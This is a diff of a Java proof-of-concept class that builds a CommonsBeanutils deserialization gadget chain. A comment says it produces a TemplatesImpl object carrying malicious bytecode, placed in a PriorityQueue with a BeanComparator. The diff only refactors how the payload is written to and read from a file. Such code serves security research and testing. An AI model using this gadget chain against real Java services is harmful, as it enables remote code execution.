@@ -14,8 +14,6 @@ import java.util.PriorityQueue;
  */
 public class CommonBeanUtils {
 
-	public static String fileName = "CommonBeanUtils.bin";
-
 	public static void main(String[] args) throws Exception {
 
 		// 生成包含恶意类字节码的 TemplatesImpl 类
@@ -45,7 +43,7 @@ public class CommonBeanUtils {
 		field2.setAccessible(true);
 		field2.set(queue, beanComparator);
 
-		SerializeUtil.writeObjectToFile(queue, fileName);
-		SerializeUtil.readFileObject(fileName);
+		SerializeUtil.writeObjectToFile(queue);
+		SerializeUtil.readFileObject();
 	}
 }
